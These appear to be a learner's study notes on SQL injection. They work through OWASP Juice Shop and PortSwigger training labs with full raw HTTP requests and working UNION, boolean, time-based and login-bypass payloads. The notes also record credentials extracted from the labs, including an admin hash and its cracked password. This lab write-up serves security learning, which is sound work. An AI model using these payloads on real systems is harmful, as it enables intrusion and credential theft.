===================================================================
SQL Injection
===================================================================

this tbales pribdes access to databse metadata
====================================
SQLite  -> sqlite_master
Mysql ->  information_schema
POstgreSQL -> information_schema
Oracle -> dba_tables
=====================================

SQL injection types

1- In-band (Error Based  , UNION based)
2- out-of-band
2- Blind

In-band Lunch the attack and get the result  
   Error based -> Get infromation about the database and it is structure from Error message (return databased enginr and vriable)
   UNION based -> Combine the result from ligtmate query with those from our attack to extract data

Out-of-band -> Exfiltrate data using a diffrent channel than the request was made with use DNS , HTTP send the reult to webserver
 
Blind -> Relay on a change of behavior with the database in prder to renstruct infromation the attacker can not see the result
          

Boolean based attacks
SELECT * from Produect where id='555' or 1=1 ; 1=1 always true  will retuen every single product in the database  

Time Based -> relay on pasuing the databased in certain time  
SELECT * from Produect where id='555' or 1=1 waitfor delay "00:00:10" ;


==========================================================================
CHEAT SHEETS 
==========================================================================
https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet

https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/   

https://portswigger.net/web-security/sql-injection/cheat-sheet

https://portswigger.net/web-security/sql-injection/union-attacks

https://portswigger.net/web-security/sql-injection/examining-the-database

https://portswigger.net/web-security/sql-injection/blind

https://sqlzoo.net/wiki/SQL_Tutorial

https://pwning.owasp-juice.shop/part2/injection.html





=============================================================================
INFORMATION GATHRING
=============================================================================
https://juice-shop.herokuapp.com/#/search?q=' # test on this url
let but ' or  " or basic payload 'or 1=1;--
after we but payload this error hust shows up 

or 1=1;-- , ' and 1=1;-- // Boolean Attack 

{
  "error": {
    "message": "SQLITE_ERROR: near \";\": syntax error",
    "stack": "Error: SQLITE_ERROR: near \";\": syntax error",
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%' or 1=1;--%' OR description LIKE '%' or 1=1;--%') AND deletedAt IS NULL) ORDER BY name"
  }
}

from this error we can detremice sql engine wich is SQLite 
and the QUERY
SELECT * FROM Products WHERE ((name LIKE '%' or 1=1;--%' OR description LIKE '%' or 1=1;--%') AND deletedAt IS NULL) ORDER BY name"

then i will try UNION attck 

')) UNION SELECT name,name,name,name,name,name,name,name,name from sqlite_master WHERE type="table";--

'))+UNION+SELECT+name,name,name,name,name,name,name,name,name+from+sqlite_master+WHERE+type%3d"table"%3b-- -> Encoded 

# Retive SQL VERSION
'))+UNION+SELECT+sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version(),sqlite_version()%3b+--


===============================================================================
SQL INJECTION HANDSON 
===============================================================================
POST /rest/user/login HTTP/1.1
Host: juice-shop.herokuapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 59
Origin: https://juice-shop.herokuapp.com
Connection: close
Referer: https://juice-shop.herokuapp.com/
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=mJBpEKkqbOJZnP15M3Legajov80bxCrfr2d2YWDymNRV4xwz6pXlQ9Br7WDO
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

{"email":"test@gmail.com' or 1=1;--","password":"password"}

in the LOG IN page  
SQL injection  in the email 
it si retive token for admin 

ir is JWT token 
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiJ1bmRlZmluZWQiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDctMjAgMTA6NTg6MTEuODAwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDctMjAgMTE6MDA6NDEuMTQyICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY4OTg1MTA2Nn0.O18bqQ6SAcqDIJ0Tg0T8Et2KArAdW2BbnpKPbvy8Ty9m1cBvLMXTMOp0XxpbMB5jcTPmiHmQFQK_2YAjZOfP5XJAM4VAFbpEVptBHnffkiAe2oFu7iCpt9t_CmVml9bHOzXsgSt1doEWzKc6ue02-FroVN3o6KyaQBN09AkOdis

it is retive this 

{
  "status": "success",
  "data": {
    "id": 1,
    "username": "",
    "email": "admin@juice-sh.op",
    "password": "0192023a7bbd73250516f069df18b500",
    "role": "admin",
    "deluxeToken": "",
    "lastLoginIp": "undefined",
    "profileImage": "assets/public/images/uploads/defaultAdmin.png",
    "totpSecret": "",
    "isActive": true,
    "createdAt": "2023-07-20 10:58:11.800 +00:00",
    "updatedAt": "2023-07-20 11:00:41.142 +00:00",
    "deletedAt": null
  },
  "iat": 1689851066
}
wich contain admin password 


0192023a7bbd73250516f069df18b500 ->	admin123


Then try get ERROR
{
  "error": {
    "message": "SQLITE_ERROR: unrecognized token: \"5f4dcc3b5aa765d61d8327deb882cf99\"",
    "stack": "Error\n    at Database.<anonymous> (/app/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)\n    at /app/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50\n    at new Promise (<anonymous>)\n    at Query.run (/app/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)\n    at /app/node_modules/sequelize/lib/sequelize.js:315:28\n    at process.processTicksAndRejections (node:internal/process/task_queues:95:5)",
    "name": "SequelizeDatabaseError",
    "parent": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = ''' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL"
    },
    "original": {
      "errno": 1,
      "code": "SQLITE_ERROR",
      "sql": "SELECT * FROM Users WHERE email = ''' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL"
    },
    "sql": "SELECT * FROM Users WHERE email = ''' AND password = '5f4dcc3b5aa765d61d8327deb882cf99' AND deletedAt IS NULL",
    "parameters": {}
  }
}

from the search query we can retive the all users and there passowrd 
using 
GET /rest/products/search?q='))+UNION+SELECT+id,email,password,null,null,null,null,null,null+from+Users+%3b-- HTTP/1.1
Host: juice-shop.herokuapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-User-Email: " or 1=1 ; --
Connection: close
Referer: https://juice-shop.herokuapp.com/
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=OYkQVNDKna3641OMErXwez2AOnC1f3LuZvsPw0RZxPpvoJWyB5b8lgqj7m9L
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
If-None-Match: W/"3250-u5X6f4wb9HWfZuMSo0Hym2wMqGk"

use this payload -> '))+UNION+SELECT+id,email,password,null,null,null,null,null,null+from+Users+%3b--


to see the sql query used to create tables wich help us to see the columns  in sqlite master table
eeeee')) UNION SELECT sql,sql,sql,sql,sql,sql,sql,sql,sql from sqlite_master ;--

it will give us internal server error becuase the number of the sql so we will leave one sql
and but numbers in the other 8 columns

')) UNION SELECT sql,'2','3','4','5','6','7','8','9' from sqlite_master --

GET /rest/products/search?q='))+UNION+SELECT+sql,'2','3','4','5','6','7','8','9'+from+sqlite_master+-- HTTP/1.1
Host: juice-shop.herokuapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-User-Email: " or 1=1 ; --
Connection: close
Referer: https://juice-shop.herokuapp.com/
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=OYkQVNDKna3641OMErXwez2AOnC1f3LuZvsPw0RZxPpvoJWyB5b8lgqj7m9L
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
If-None-Match: W/"3250-u5X6f4wb9HWfZuMSo0Hym2wMqGk"

this we retive the crete table sql querys 
"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', 
`email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', 
`deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` 
VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', 
`isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"


GET /rest/products/search?q='))+UNION+SELECT+id,email,password,role,totpSecret,null,null,null,null+from+Users+%3b-- HTTP/1.1
Host: juice-shop.herokuapp.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-User-Email: " or 1=1 ; --
Connection: close
Referer: https://juice-shop.herokuapp.com/
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=OYkQVNDKna3641OMErXwez2AOnC1f3LuZvsPw0RZxPpvoJWyB5b8lgqj7m9L
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
If-None-Match: W/"3250-u5X6f4wb9HWfZuMSo0Hym2wMqGk"


REtive more USer infromation 


=====================================================================================
PORT SWigger LABS
=====================================================================================
GET /filter?category=Lifestyle'+or+1%3d1+-- HTTP/1.1
Host: 0a7e00a9031c9dbd80835d34004c00f2.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0a7e00a9031c9dbd80835d34004c00f2.web-security-academy.net/
Cookie: session=GICzcubAqu8kJQ8X0BtMmUIH4mffgrr0
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

from this request we can retive the hiden data using the payload ' or 1=1 -- 

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
senoce the 1=1 always true we get all the items  

=====================================================================================
Subverting application logic
=====================================================================================
Sometimes the allow user to enter username and password after input the sql statment 
is  
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

the attacker can login without the password bu comment the password parmeter -- 
administrator'--
after that the query is
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

The Request 

POST /login HTTP/1.1
Host: 0a65004404bb973380e06286003a0096.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 83
Origin: https://0a65004404bb973380e06286003a0096.web-security-academy.net
Connection: close
Referer: https://0a65004404bb973380e06286003a0096.web-security-academy.net/login
Cookie: session=JPwGMfVGpPfFCuDaolBnF32I3ZByNzgR
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

csrf=bmvezEIrkyzzbA5bBe3vMazvC44GoPfa&username=administrator%27--&password=wdwqdwqd


=====================================================================================
SQL injection attack, querying the database type and version on Oracle
=====================================================================================
Using Union Based Attack We Can Retive other tbales 
UNION SELECT username , passwordd from tbales  ; 

first we need to idenfty number of columns 
' ORDER BY 1--
' ORDER BY 2--

if we increse number and get error so we can detmine number of columns

identify user
GET /filter?category='+UNION+SELECT+user,NULL+FROM+dual+-- HTTP/1.1
Host: 0a93004f04222bf280cf4ee8006700d8.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0a93004f04222bf280cf4ee8006700d8.web-security-academy.net/
Cookie: session=f9petXDTcRSxjAoB3YKHlqwbulCKd94Y
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

After Identify The Number OF coulmns we can use this payload
' UNION SELECT NULL,banner FROM V$version -- 
the request look like 
GET /filter?category='+UNION+SELECT+NULL,banner+FROM+v$version+-- HTTP/1.1
Host: 0a93004f04222bf280cf4ee8006700d8.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0a93004f04222bf280cf4ee8006700d8.web-security-academy.net/
Cookie: session=f9petXDTcRSxjAoB3YKHlqwbulCKd94Y
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

=====================================================================================
SQL injection attack, querying the database type and version on MySQL and Microsoft
=====================================================================================
first we need to identify the parmater ti inject 
using this ' character 

GET /filter?category=Gifts' HTTP/1.1
Host: 0abb0084047e98ea8091f35c00a1005a.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0abb0084047e98ea8091f35c00a1005a.web-security-academy.net/
Cookie: session=UUpChSbifEzpziuLfTPRYGQW2wzpSkBO
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

identify number of colulns using this payloads 
Gifts'+ORDER+BY+3--+ note the space after -- 

Oracle  --comment
Microsoft   --comment
/*comment*/
PostgreSQL  --comment
/*comment*/
MySQL   #comment
-- comment [Note the space after the double dash]
/*comment*/

GET /filter?category=Gifts'+ORDER+BY+3--+ HTTP/1.1
Host: 0abb0084047e98ea8091f35c00a1005a.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0abb0084047e98ea8091f35c00a1005a.web-security-academy.net/
Cookie: session=UUpChSbifEzpziuLfTPRYGQW2wzpSkBO
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

wich is 2 the 3 give us 500 internal server error

REtive Database VErsion NUmber in MYSQL
Dont Forget the space after -- wieich is + encoded 

GET /filter?category=Gifts'+UNION+SELECT+NULL,%40%40version--+ HTTP/1.1
Host: 0abb0084047e98ea8091f35c00a1005a.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0abb0084047e98ea8091f35c00a1005a.web-security-academy.net/
Cookie: session=UUpChSbifEzpziuLfTPRYGQW2wzpSkBO
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1


=====================================================================================
Lab: SQL injection attack, listing the database contents on Oracle
=====================================================================================
First We need to list all  the columns  

GET /filter?category=Pets'+UNION+SELECT+NULL,table_name+FROM+all_tables--+ HTTP/1.1
Host: 0ab900d0046eb09082f716a000980092.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0ab900d0046eb09082f716a000980092.web-security-academy.net/
Cookie: session=fI9piH6nwtsz07XsrYhdGAmqkF4I9eAO
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

THen we need to list all coulmns in the tables 

GET /filter?category=Pets'+UNION+select+NULL,column_name+FROM+all_tab_columns+WHERE+table_name+%3d+'USERS_EVYEJI'--+ HTTP/1.1
Host: 0ab900d0046eb09082f716a000980092.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0ab900d0046eb09082f716a000980092.web-security-academy.net/
Cookie: session=fI9piH6nwtsz07XsrYhdGAmqkF4I9eAO
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

After that we need to retive the admin username and password

GET /filter?category=Pets'+UNION+SELECT+USERNAME_YDTYXY,PASSWORD_SSWRPX++FROM+USERS_EVYEJI--+ HTTP/1.1
Host: 0ab900d0046eb09082f716a000980092.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0ab900d0046eb09082f716a000980092.web-security-academy.net/
Cookie: session=fI9piH6nwtsz07XsrYhdGAmqkF4I9eAO
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1



 
administrator   xewxpro3xkuu7wfnmktj

=====================================================================================
SQL injection UNION attack, determining the number of columns returned by the query
=====================================================================================

By Perfroming the UNION based attack should NULL mach number of Columns 

GET /filter?category=Accessories'+UNION+SELECT+NULL,NULL,NULL--+ HTTP/1.1
Host: 0ae3009a04b1a7688a885181000f0080.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0ae3009a04b1a7688a885181000f0080.web-security-academy.net/
Cookie: session=U1Nqfem9b2tT7SyV6fLmaxOegT4kNROM
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

=====================================================================================
Lab: SQL injection UNION attack, finding a column containing text
=====================================================================================

GET /filter?category=Pets'+UNION+SELECT+NULL,'IP0Lnf',NULL--+ HTTP/1.1
Host: 0ae8005e04590d848122a776002d00a9.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0ae8005e04590d848122a776002d00a9.web-security-academy.net/
Cookie: session=mYwjrIn8IOul4mWDtjjNL0y6obKeOFRu
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

=====================================================================================
Lab: SQL injection UNION attack, retrieving data from other tables
=====================================================================================

First We Need to Identify Number of Columns In The Table  

GET /filter?category=Pets'+ORDER+BY+2--+ HTTP/1.1
Host: 0a6f006203c1bf4682508408008a005b.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0a6f006203c1bf4682508408008a005b.web-security-academy.net/
Cookie: session=5I7xqWoaqMwUffhJhkIaWvMGLIY9NLm0
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

After That Retive the username and the password  from the database using the provided information  

GET /filter?category=Pets'+UNION+SELECT+username,password+FROM+users--+ HTTP/1.1
Host: 0a6f006203c1bf4682508408008a005b.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://0a6f006203c1bf4682508408008a005b.web-security-academy.net/
Cookie: session=5I7xqWoaqMwUffhJhkIaWvMGLIY9NLm0
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

